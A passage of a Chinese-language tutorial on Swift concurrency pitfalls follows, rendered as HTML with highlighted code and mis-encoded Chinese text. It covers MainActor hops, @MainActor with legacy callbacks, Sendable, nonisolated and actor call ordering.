    <span class="hljs-comment">// æ‰¹é‡åŠ è½½ç”¨æˆ·</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">loadUsers</span>(<span class="hljs-params">ids</span>: [<span class="hljs-type">Int</span>]) -&gt; [<span class="hljs-type">User</span>] {
        ids.map { <span class="hljs-type">User</span>(id: <span class="hljs-variable">$0</span>) }  <span class="hljs-comment">// ä¸€æ¬¡å®Œæˆæ‰€æœ‰æ“ä½œ</span>
    }
}

<span class="hljs-meta">@MainActor</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DataModel</span> {
    <span class="hljs-keyword">let</span> database <span class="hljs-operator">=</span> <span class="hljs-type">Database</span>()
    <span class="hljs-keyword">var</span> users: [<span class="hljs-type">User</span>] <span class="hljs-operator">=</span> []

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">loadUsers</span>() <span class="hljs-keyword">async</span> {
        <span class="hljs-keyword">let</span> ids <span class="hljs-operator">=</span> <span class="hljs-type">Array</span>(<span class="hljs-number">1</span><span class="hljs-operator">...</span><span class="hljs-number">100</span>)
        <span class="hljs-comment">// âœ… ä¸€æ¬¡è·³è½¬å»ï¼Œä¸€æ¬¡è·³è½¬å›</span>
        <span class="hljs-keyword">let</span> newUsers <span class="hljs-operator">=</span> <span class="hljs-keyword">await</span> database.loadUsers(ids: ids)
        users.append(contentsOf: newUsers)
    }
}
</code></pre>
<p>ä½•æ—¶çœŸæ­£å½±å“æ€§èƒ½ï¼Ÿ</p>
<p>åœ¨åä½œçº¿ç¨‹æ± ï¼ˆcooperative poolï¼‰å†…è·³è½¬å¾ˆä¾¿å®œã€‚é—®é¢˜å‡ºç°åœ¨ä¸ MainActor çš„è·³è½¬ï¼Œå› ä¸ºä¸»çº¿ç¨‹ä¸åœ¨åä½œæ± ä¸­ï¼Œéœ€è¦çœŸæ­£çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚</p>
<p>ç»éªŒæ³•åˆ™ï¼šå¦‚æœä¸€æ¬¡æ“ä½œä¸­æœ‰è¶…è¿‡ 10 æ¬¡è·³è½¬åˆ° MainActorï¼Œå¾ˆå¯èƒ½æ¶æ„æœ‰é—®é¢˜ã€‚</p>
<h2 data-id="heading-2">é™·é˜± 3ï¼š@MainActorâ€”â€”è™šå‡çš„å®‰å…¨æ„Ÿ</h2>
<p>è¿™æ˜¯ Swift 6 å‘å¸ƒåæ•è·æ•°ç™¾åå¼€å‘è€…çš„é™·é˜±ã€‚<code>@MainActor</code> æ³¨è§£ä¸æ€»èƒ½ä¿è¯åœ¨ä¸»çº¿ç¨‹æ‰§è¡Œã€‚</p>
<p>é—®é¢˜æ ¹æº</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-meta">@MainActor</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ViewModel</span> {
    <span class="hljs-keyword">var</span> data: <span class="hljs-type">String</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">updateData</span>() {
        <span class="hljs-comment">// Swift 5 ä¸­ï¼šå¯èƒ½ä¸åœ¨ä¸»çº¿ç¨‹ï¼</span>
        data <span class="hljs-operator">=</span> <span class="hljs-string">"updated"</span>
    }
}

<span class="hljs-comment">// åœ¨æŸä¸ªåœ°æ–¹...</span>
<span class="hljs-type">DispatchQueue</span>.global().async {
    <span class="hljs-keyword">let</span> vm <span class="hljs-operator">=</span> <span class="hljs-type">ViewModel</span>()
    vm.updateData()  <span class="hljs-comment">// âš ï¸ åœ¨åå°çº¿ç¨‹æ‰§è¡Œï¼</span>
}
</code></pre>
<p>å…³é”®åŒºåˆ«ï¼š</p>
<ol>
<li>@MainActor éš”ç¦»æ€§ï¼šä¿è¯çŠ¶æ€è®¿é—®è¢«éš”ç¦»åˆ° MainActorï¼ˆMainActor ä¸ä¸»çº¿ç¨‹ç»‘å®šï¼‰</li>
<li>å¼‚æ­¥è¾¹ç•Œå¼ºåˆ¶æ‰§è¡Œï¼šä½†æ­¤ä¿è¯åªåœ¨è°ƒç”¨è·¨è¶Šéš”ç¦»è¾¹ç•Œï¼ˆasync boundaryï¼‰æ—¶ç”Ÿæ•ˆ</li>
</ol>
<p>å½“ä»£ç ç»•è¿‡è¿™ä¸ªè¾¹ç•Œâ€”â€”ç‰¹åˆ«æ˜¯ä¸ Objective-C é—ç•™ API äº¤äº’æ—¶ï¼Œé—®é¢˜å°±å‡ºç°äº†ã€‚è‹¹æœæ¡†æ¶çš„å›è°ƒ"ä¸çŸ¥é“" Swift Concurrencyï¼Œä¼šç›´æ¥è°ƒç”¨ä½ çš„æ–¹æ³•ï¼Œä¸ç»è¿‡å¼‚æ­¥è¾¹ç•Œã€‚</p>
<p>æ¢å¥è¯è¯´ï¼š<code>@MainActor</code> æ˜¯ç¼–è¯‘æ—¶å¥‘çº¦ï¼Œåªåœ¨ç¼–è¯‘å™¨"çœ‹åˆ°"å®Œæ•´è°ƒç”¨è·¯å¾„çš„åœ°æ–¹å¼ºåˆ¶æ‰§è¡Œã€‚é—ç•™ API å¯¹å®ƒæ¥è¯´æ˜¯ä¸ªé»‘ç®±ã€‚</p>
<p>ä¸é—ç•™ API äº¤äº’çš„å¤±è´¥æ¡ˆä¾‹</p>
<p>æ¡ˆä¾‹ 1ï¼šç³»ç»Ÿæ¡†æ¶å›è°ƒ</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> LocalAuthentication

<span class="hljs-meta">@MainActor</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BiometricManager</span> {
    <span class="hljs-keyword">var</span> isAuthenticated <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">authenticate</span>() {
        <span class="hljs-keyword">let</span> context <span class="hljs-operator">=</span> <span class="hljs-type">LAContext</span>()
        context.evaluatePolicy(
            .deviceOwnerAuthentication,
            localizedReason: <span class="hljs-string">"è¯·ç™»å½•"</span>
        ) { success, <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span>
            <span class="hljs-comment">// âŒ è¿™ä¸ªå›è°ƒæ€»æ˜¯åœ¨åå°çº¿ç¨‹ï¼</span>
            <span class="hljs-keyword">self</span>.isAuthenticated <span class="hljs-operator">=</span> success  <span class="hljs-comment">// æ•°æ®ç«äº‰ï¼</span>
        }
    }
}
</code></pre>
<p>æ¡ˆä¾‹ 2ï¼šObjective-C ä»£ç†æ¨¡å¼</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> CoreLocation

<span class="hljs-meta">@MainActor</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">LocationHandler</span>: <span class="hljs-title class_">NSObject</span>, <span class="hljs-title class_">CLLocationManagerDelegate</span> {
    <span class="hljs-keyword">var</span> lastLocation: <span class="hljs-type">CLLocation</span>?

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">locationManager</span>(
        <span class="hljs-keyword">_</span> <span class="hljs-params">manager</span>: <span class="hljs-type">CLLocationManager</span>,
        <span class="hljs-params">didUpdateLocations</span> <span class="hljs-params">locations</span>: [<span class="hljs-type">CLLocation</span>]
    ) {
        <span class="hljs-comment">// âŒ å¯èƒ½ä»ä»»æ„çº¿ç¨‹è°ƒç”¨ï¼</span>
        lastLocation <span class="hljs-operator">=</span> locations.last
    }
}
</code></pre>
<p>è§£å†³æ–¹æ¡ˆï¼šæ˜¾å¼è°ƒåº¦</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// æ–¹æ¡ˆ 1ï¼šä½¿ç”¨ async/await API</span>
<span class="hljs-meta">@MainActor</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BiometricManager</span> {
    <span class="hljs-keyword">var</span> isAuthenticated <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">authenticate</span>() <span class="hljs-keyword">async</span> {
        <span class="hljs-keyword">let</span> context <span class="hljs-operator">=</span> <span class="hljs-type">LAContext</span>()

        <span class="hljs-keyword">do</span> {
            <span class="hljs-keyword">let</span> success <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> context.evaluatePolicy(
                .deviceOwnerAuthentication,
                localizedReason: <span class="hljs-string">"è¯·ç™»å½•"</span>
            )
            isAuthenticated <span class="hljs-operator">=</span> success  <span class="hljs-comment">// âœ… ç°åœ¨åœ¨ MainActor ä¸Š</span>
        } <span class="hljs-keyword">catch</span> {
            isAuthenticated <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
        }
    }
}

<span class="hljs-comment">// æ–¹æ¡ˆ 2ï¼šä½¿ç”¨ Task æ˜¾å¼è·³è½¬</span>
<span class="hljs-keyword">extension</span> <span class="hljs-title class_">LocationHandler</span> {
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">locationManager</span>(
        <span class="hljs-keyword">_</span> <span class="hljs-params">manager</span>: <span class="hljs-type">CLLocationManager</span>,
        <span class="hljs-params">didUpdateLocations</span> <span class="hljs-params">locations</span>: [<span class="hljs-type">CLLocation</span>]
    ) {
        <span class="hljs-comment">// æ˜¾å¼è·³è½¬åˆ° MainActor</span>
        <span class="hljs-type">Task</span> { <span class="hljs-meta">@MainActor</span> <span class="hljs-keyword">in</span>
            lastLocation <span class="hljs-operator">=</span> locations.last  <span class="hljs-comment">// âœ… å®‰å…¨</span>
        }
    }
}

<span class="hljs-comment">// æ–¹æ¡ˆ 3ï¼šä½¿ç”¨ @MainActor é—­åŒ…</span>
<span class="hljs-keyword">func</span> <span class="hljs-title function_">locationManager</span>(
    <span class="hljs-keyword">_</span> <span class="hljs-params">manager</span>: <span class="hljs-type">CLLocationManager</span>,
    <span class="hljs-params">didUpdateLocations</span> <span class="hljs-params">locations</span>: [<span class="hljs-type">CLLocation</span>]
) {
    <span class="hljs-comment">// æ˜¾å¼åœ¨ä¸»çº¿ç¨‹æ‰§è¡Œ</span>
    <span class="hljs-type">DispatchQueue</span>.main.async { <span class="hljs-meta">@MainActor</span> <span class="hljs-keyword">in</span>
        <span class="hljs-keyword">self</span>.lastLocation <span class="hljs-operator">=</span> locations.last
    }
}
</code></pre>
<h2 data-id="heading-3">é™·é˜± 4ï¼šSendableâ€”â€”ç¼–è¯‘å™¨ä¸ä¼šæ•è·æ‰€æœ‰é—®é¢˜</h2>
<p><code>Sendable</code> åè®®æ ‡è®°å¯åœ¨éš”ç¦»åŸŸä¹‹é—´å®‰å…¨ä¼ é€’çš„ç±»å‹ã€‚ä½†é—®é¢˜æ˜¯ï¼šç¼–è¯‘å™¨ç»å¸¸æ”¾è¿‡ä¸å®‰å…¨çš„ä»£ç ã€‚</p>
<p>ç¼–è¯‘å™¨ç›²åŒºç¤ºä¾‹</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// éçº¿ç¨‹å®‰å…¨çš„å¯å˜çŠ¶æ€ç±»</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UnsafeCache</span> {
    <span class="hljs-keyword">var</span> items: [<span class="hljs-type">String</span>: <span class="hljs-type">Data</span>] <span class="hljs-operator">=</span> [:]  <span class="hljs-comment">// å¯å˜çŠ¶æ€ï¼Œéçº¿ç¨‹å®‰å…¨</span>
}

<span class="hljs-keyword">actor</span> <span class="hljs-title class_">DataProcessor</span> {
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">process</span>(<span class="hljs-params">cache</span>: <span class="hljs-type">UnsafeCache</span>) <span class="hljs-keyword">async</span> {
        <span class="hljs-comment">// âš ï¸ Swift 5 ä¸­ç¼–è¯‘æ— è­¦å‘Šï¼</span>
        cache.items[<span class="hljs-string">"key"</span>] <span class="hljs-operator">=</span> <span class="hljs-type">Data</span>()  <span class="hljs-comment">// æ•°æ®ç«äº‰ï¼</span>
    }
}
</code></pre>
<p>@unchecked Sendableï¼šåŒåˆƒå‰‘</p>
<p>è®¸å¤šå¼€å‘è€…ä¸ºäº†æ¶ˆé™¤ç¼–è¯‘å™¨è­¦å‘Šè€Œæ·»åŠ  <code>@unchecked Sendable</code>ï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">extension</span> <span class="hljs-title class_">UnsafeCache</span>: @<span class="hljs-title class_">unchecked</span> <span class="hljs-title class_">Sendable</span> {}

<span class="hljs-comment">// è¿™å‘Šè¯‰ç¼–è¯‘å™¨ï¼š"ç›¸ä¿¡æˆ‘ï¼Œæˆ‘çŸ¥é“æˆ‘åœ¨åšä»€ä¹ˆ"</span>
<span class="hljs-comment">// ä½†é—®é¢˜åœ¨äºï¼šå¤§å¤šæ•°æ—¶å€™ä½ å¹¶ä¸çŸ¥é“</span>
</code></pre>
<p>ä½•æ—¶ä½¿ç”¨ @unchecked Sendableï¼ˆåˆç†åœºæ™¯ï¼‰</p>
<ol>
<li>æŠ€æœ¯ä¸Šå¯å˜ä½†å®é™…ä¸å¯å˜çš„ç±»å‹ï¼ˆå¦‚å»¶è¿Ÿåˆå§‹åŒ–ï¼‰</li>
<li>æœ‰å†…éƒ¨åŒæ­¥æœºåˆ¶çš„ç±»å‹ï¼ˆå¦‚ä½¿ç”¨é”æˆ–åŸå­æ“ä½œï¼‰</li>
<li>å¯åŠ¨æ—¶åˆå§‹åŒ–ä¸€æ¬¡çš„ Singleton</li>
</ol>
<p>ä½•æ—¶ç»å¯¹ä¸è¦ä½¿ç”¨ @unchecked Sendable</p>
<ol>
<li>"ä¸ºäº†è®©ä»£ç ç¼–è¯‘é€šè¿‡" â€”â€”è¿™æ˜¯æœ€å±é™©çš„ç†ç”±</li>
<li>æ²¡æœ‰åŒæ­¥æœºåˆ¶çš„å¯å˜çŠ¶æ€ç±»</li>
<li>ä½ æ— æ³•æ§åˆ¶çš„ç¬¬ä¸‰æ–¹ç±»å‹</li>
</ol>
<p>æ›´ä¼˜æ–¹æ¡ˆï¼šé‡æ„ä¸º Actor</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// âŒ ä¸è¦è¿™æ ·åš</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UnsafeCache</span>: @<span class="hljs-title class_">unchecked</span> <span class="hljs-title class_">Sendable</span> {
    <span class="hljs-keyword">var</span> items: [<span class="hljs-type">String</span>: <span class="hljs-type">Data</span>] <span class="hljs-operator">=</span> [:]
}

<span class="hljs-comment">// âœ… æ›´å¥½çš„åšæ³•</span>
<span class="hljs-keyword">actor</span> <span class="hljs-title class_">SafeCache</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> items: [<span class="hljs-type">String</span>: <span class="hljs-type">Data</span>] <span class="hljs-operator">=</span> [:]
    
    <span class="hljs-comment">// æä¾›å®‰å…¨çš„è®¿é—®æ–¹æ³•</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">get</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">key</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">Data</span>? {
        items[key]
    }
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">set</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">key</span>: <span class="hljs-type">String</span>, <span class="hljs-keyword">_</span> <span class="hljs-params">value</span>: <span class="hljs-type">Data</span>) {
        items[key] <span class="hljs-operator">=</span> value
    }
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">remove</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">key</span>: <span class="hljs-type">String</span>) {
        items.removeValue(forKey: key)
    }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">actor</span> <span class="hljs-title class_">DataProcessor</span> {
    <span class="hljs-keyword">let</span> cache <span class="hljs-operator">=</span> <span class="hljs-type">SafeCache</span>()  <span class="hljs-comment">// å¼ºåˆ¶é€šè¿‡ Actor è®¿é—®</span>
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">process</span>() <span class="hljs-keyword">async</span> {
        <span class="hljs-keyword">await</span> cache.set(<span class="hljs-string">"key"</span>, <span class="hljs-type">Data</span>())
        <span class="hljs-keyword">let</span> data <span class="hljs-operator">=</span> <span class="hljs-keyword">await</span> cache.get(<span class="hljs-string">"key"</span>)
    }
}
</code></pre>
<h2 data-id="heading-4">é™·é˜± 5ï¼šnonisolated ä¸æ„å‘³ç€ thread-safe</h2>
<p><code>nonisolated</code> å…³é”®å­—ä»…è¡¨ç¤ºæ–¹æ³•/å±æ€§ä¸éœ€è¦ Actor éš”ç¦»ï¼Œä¸è¡¨ç¤ºå®ƒæ˜¯ thread-safe çš„ã€‚</p>
<p>å¸¸è§è¯¯è§£</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">actor</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> count <span class="hljs-operator">=</span> <span class="hljs-number">0</span>

    <span class="hljs-comment">// âœ… æ­£ç¡®ï¼šä¸è®¿é—® Actor çŠ¶æ€</span>
    <span class="hljs-keyword">nonisolated</span> <span class="hljs-keyword">var</span> description: <span class="hljs-type">String</span> {
        <span class="hljs-string">"Counter instance"</span>  <span class="hljs-comment">// OKï¼Œä¸è§¦ç¢°çŠ¶æ€</span>
    }

    <span class="hljs-comment">// âŒ ç¼–è¯‘é”™è¯¯ï¼šä¸èƒ½è®¿é—® Actor éš”ç¦»çš„çŠ¶æ€</span>
    <span class="hljs-keyword">nonisolated</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">badIdea</span>() {
        <span class="hljs-comment">// é”™è¯¯ï¼šActor-isolated property 'count' </span>
        <span class="hljs-comment">// cannot be referenced from a non-isolated context</span>
        <span class="hljs-built_in">print</span>(count)
    }
}
</code></pre>
<p>å…¸å‹é”™è¯¯ï¼šä¸ºåè®®ä¸€è‡´æ€§ä½¿ç”¨ nonisolated</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">actor</span> <span class="hljs-title class_">Wallet</span>: <span class="hljs-title class_">CustomStringConvertible</span> {
    <span class="hljs-keyword">let</span> name: <span class="hljs-type">String</span>          <span class="hljs-comment">// å¸¸é‡ï¼Œééš”ç¦»</span>
    <span class="hljs-keyword">var</span> balance: <span class="hljs-type">Double</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>   <span class="hljs-comment">// Actor éš”ç¦»çŠ¶æ€</span>

    <span class="hljs-comment">// ä¸ºç¬¦åˆåè®®å¿…é¡»å®ç° nonisolated</span>
    <span class="hljs-keyword">nonisolated</span> <span class="hljs-keyword">var</span> description: <span class="hljs-type">String</span> {
        <span class="hljs-comment">// âŒ é”™è¯¯ï¼š"\(name): \(balance)" ä¼šå¤±è´¥</span>
        
        <span class="hljs-comment">// âœ… åªèƒ½è®¿é—®ä¸å¯å˜çŠ¶æ€ï¼š</span>
        name
    }
}
</code></pre>
<p>æ­£ç¡®å®ç°åè®®çš„æ–¹å¼</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">actor</span> <span class="hljs-title class_">Wallet</span>: <span class="hljs-title class_">CustomStringConvertible</span> {
    <span class="hljs-keyword">let</span> name: <span class="hljs-type">String</span>
    <span class="hljs-keyword">private(set)</span> <span class="hljs-keyword">var</span> balance: <span class="hljs-type">Double</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
    
    <span class="hljs-comment">// æä¾› Actor éš”ç¦»çš„æ›´æ–°æ–¹æ³•</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">deposit</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">amount</span>: <span class="hljs-type">Double</span>) {
        balance <span class="hljs-operator">+=</span> amount
    }
    
    <span class="hljs-comment">// nonisolated åªèƒ½è®¿é—®ééš”ç¦»æˆå‘˜</span>
    <span class="hljs-keyword">nonisolated</span> <span class="hljs-keyword">var</span> description: <span class="hljs-type">String</span> {
        <span class="hljs-string">"Wallet(name: <span class="hljs-subst">\(name)</span>)"</span>
    }
    
    <span class="hljs-comment">// æä¾›å¼‚æ­¥è·å–å®Œæ•´æè¿°çš„æ–¹æ³•</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">detailedDescription</span>() <span class="hljs-keyword">async</span> -&gt; <span class="hljs-type">String</span> {
        <span class="hljs-keyword">await</span> <span class="hljs-string">"<span class="hljs-subst">\(name)</span>: $<span class="hljs-subst">\(balance)</span>"</span>
    }
}
</code></pre>
<p>Swift 6.2 çš„æ–°å˜åŒ–</p>
<p>åœ¨ <code>MainActorIsolationByDefault</code> æ¨¡å¼ä¸‹ï¼Œ<code>nonisolated</code> è·å¾—æ–°å«ä¹‰ï¼šè¡¨ç¤º"ç»§æ‰¿è°ƒç”¨è€…çš„éš”ç¦»æ€§"ã€‚</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// å¯ç”¨ MainActorIsolationByDefault = true</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DataManager</span> {
    <span class="hljs-comment">// é»˜è®¤ @MainActor</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">processOnMain</span>() { }
    
    <span class="hljs-comment">// ç»§æ‰¿è°ƒç”¨è€…ä¸Šä¸‹æ–‡ï¼ˆæ›´çµæ´»ï¼‰</span>
    <span class="hljs-keyword">nonisolated</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">processAnywhere</span>() { }
    
    <span class="hljs-comment">// æ˜ç¡®åœ¨åå°æ‰§è¡Œ</span>
    <span class="hljs-meta">@concurrent</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">processInBackground</span>() <span class="hljs-keyword">async</span> { }
}
</code></pre>
<p>è¿™æ˜¯èŒƒå¼è½¬å˜â€”â€”<code>nonisolated</code> ä¸å†è¡¨ç¤º"æ— éš”ç¦»"ï¼Œè€Œæ˜¯è¡¨ç¤º"çµæ´»éš”ç¦»"ã€‚</p>
<h2 data-id="heading-5">é™·é˜± 6ï¼šActor ä¸ä¿è¯è°ƒç”¨é¡ºåº</h2>
<p>è¿™è®©è®¸å¤šä» GCD è½¬æ¥çš„å¼€å‘è€…åƒæƒŠï¼šActor ä¸ä¿è¯å¤–éƒ¨è°ƒç”¨çš„æ‰§è¡Œé¡ºåºã€‚</p>
<p>é¡ºåºçš„ä¸ç¡®å®šæ€§</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">actor</span> <span class="hljs-title class_">Logger</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> logs: [<span class="hljs-type">String</span>] <span class="hljs-operator">=</span> []

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">log</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">message</span>: <span class="hljs-type">String</span>) {
        logs.append(message)
    }

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">getLogs</span>() -&gt; [<span class="hljs-type">String</span>] { logs }
}

<span class="hljs-keyword">let</span> logger <span class="hljs-operator">=</span> <span class="hljs-type">Logger</span>()

<span class="hljs-comment">// ä»ééš”ç¦»ä¸Šä¸‹æ–‡</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">0</span><span class="hljs-operator">..&lt;</span><span class="hljs-number">10</span> {
    <span class="hljs-type">Task</span>.detached {
        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> <span class="hljs-type">Task</span>.sleep(nanoseconds: <span class="hljs-type">UInt64</span>(arc4random()) <span class="hljs-operator">%</span> <span class="hljs-number">1000000</span>)
        <span class="hljs-keyword">await</span> logger.log(<span class="hljs-string">"Message <span class="hljs-subst">\(i)</span>"</span>)
    }
}
<span class="hljs-type">Task</span> {
    <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> <span class="hljs-type">Task</span>.sleep(nanoseconds: <span class="hljs-number">200</span> <span class="hljs-operator">*</span> <span class="hljs-number">1000_000</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-keyword">await</span> logger.getLogs())
}

<span class="hljs-comment">// ç»“æœå¯èƒ½æ˜¯ï¼š[0, 2, 1, 4, 3, 6, 5, 8, 7, 9]</span>
<span class="hljs-comment">// æˆ–ä»»ä½•å…¶ä»–æ’åˆ—ç»„åˆï¼</span>
</code></pre>
<p>ä¸ºä»€ä¹ˆå¦‚æ­¤ï¼Ÿ</p>
<p>å¿…é¡»åŒºåˆ†ä¸¤ä¸ªæ¦‚å¿µï¼š</p>
<ol>
<li>Actor é‚®ç®±æ˜¯ FIFO - Actor æŒ‰æ¶ˆæ¯è¿›å…¥é‚®ç®±çš„é¡ºåºå¤„ç†</li>
<li>ä»»åŠ¡è°ƒåº¦ä¸æ˜¯ FIFO - ä½†ä»»åŠ¡å‘ Actor é‚®ç®±å‘é€æ¶ˆæ¯çš„é¡ºåºæ˜¯ä¸ç¡®å®šçš„</li>
</ol>
<p>ç®€å•è¯´ï¼šå…¥é˜Ÿé¡ºåº â‰  æ‰§è¡Œé¡ºåºã€‚æ¯ä¸ª <code>Task</code> æ˜¯ç‹¬ç«‹çš„å·¥ä½œå•å…ƒï¼Œè°ƒåº¦å™¨å¯ä»¥æŒ‰ä»»æ„é¡ºåºè¿è¡Œå®ƒä»¬ï¼Œæ‰€ä»¥æ¶ˆæ¯ä»¥ä¸å¯é¢„æµ‹çš„åºåˆ—è¿›å…¥ Actor é‚®ç®±ã€‚Actor åªä¿è¯ <code>log()</code> ä¸ä¼šå¹¶è¡Œæ‰§è¡Œâ€”â€”ä½†ä¸ä¿è¯æ¶ˆæ¯åˆ°è¾¾çš„é¡ºåºã€‚</p>
<p>è§£å†³æ–¹æ¡ˆï¼šæ˜¾å¼æ’åº</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">actor</span> <span class="hljs-title class_">OrderedLogger</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> logs: [<span class="hljs-type">String</span>] <span class="hljs-operator">=</span> []
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> pendingTask: <span class="hljs-type">Task</span>&lt;<span class="hljs-type">Void</span>, <span class="hljs-type">Never</span>&gt;?

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">log</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">message</span>: <span class="hljs-type">String</span>) <span class="hljs-keyword">async</span> {
        <span class="hljs-comment">// ç­‰å¾…å‰ä¸€ä¸ªä»»åŠ¡å®Œæˆ</span>
        <span class="hljs-keyword">let</span> previousTask <span class="hljs-operator">=</span> pendingTask
        
        <span class="hljs-comment">// åˆ›å»ºæ–°ä»»åŠ¡ï¼Œä¾èµ–å‰ä¸€ä¸ªä»»åŠ¡</span>
        pendingTask <span class="hljs-operator">=</span> <span class="hljs-type">Task</span> {
            <span class="hljs-keyword">await</span> previousTask<span class="hljs-operator">?</span>.value  <span class="hljs-comment">// ç­‰å¾…å‰ç½®ä»»åŠ¡</span>
            logs.append(message)
        }
        
        <span class="hljs-comment">// ç­‰å¾…å½“å‰ä»»åŠ¡å®Œæˆ</span>
        <span class="hljs-keyword">await</span> pendingTask<span class="hljs-operator">?</span>.value
    }
}

<span class="hljs-comment">// æ›´é«˜æ•ˆçš„ä¸²è¡Œé˜Ÿåˆ—å®ç°</span>
<span class="hljs-keyword">actor</span> <span class="hljs-title class_">SerialLogger</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> logs: [<span class="hljs-type">String</span>] <span class="hljs-operator">=</span> []
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> queue <span class="hljs-operator">=</span> <span class="hljs-type">AsyncSerialQueue</span>()  <span class="hljs-comment">// ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“</span>
    
    <span class="hljs-keyword">nonisolated</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">log</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">message</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">Task</span>&lt;<span class="hljs-type">Void</span>, <span class="hljs-type">Never</span>&gt; {
        <span class="hljs-type">Task</span>(on: queue) {
            <span class="hljs-keyword">await</span> <span class="hljs-keyword">self</span>.appendLog(message)
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">appendLog</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">message</span>: <span class="hljs-type">String</span>) {
        logs.append(message)
    }
}
</code></pre>
<h2 data-id="heading-6">å®è·µæ£€æŸ¥æ¸…å•</h2>
<p>åœ¨å°†ç±»è½¬ä¸º Actor å‰ï¼Œè¯·å›ç­”ä»¥ä¸‹é—®é¢˜ï¼š</p>
<p>âœ… é€‚åˆä½¿ç”¨ Actor çš„åœºæ™¯</p>
<ul>
<li>æœ‰åœ¨ä»»åŠ¡é—´å…±äº«çš„å¯å˜çŠ¶æ€</li>
<li>éœ€è¦çº¿ç¨‹å®‰å…¨è€Œæ— éœ€æ‰‹åŠ¨åŒæ­¥</li>
<li>çŠ¶æ€æ“ä½œä¸»è¦æ˜¯åŒæ­¥çš„</li>
</ul>
<p>âŒ ä¸é€‚åˆä½¿ç”¨ Actor çš„åœºæ™¯</p>
<ul>
<li>éœ€è¦ä¸¥æ ¼ä¿è¯æ“ä½œé¡ºåº</li>
<li>æ‰€æœ‰æ“ä½œéƒ½æ˜¯å¼‚æ­¥çš„ï¼ˆé‡å…¥ä¼šæˆä¸ºé—®é¢˜ï¼‰</li>
<li>æœ‰æ€§èƒ½å…³é”®ä»£ç ä¸”åŒ…å«å¤§é‡å°æ“ä½œ</li>
<li>éœ€è¦åŒæ­¥è®¿é—®çŠ¶æ€</li>
</ul>
<p>ğŸ” å…³é”®æ£€æŸ¥é—®é¢˜</p>
<ol>
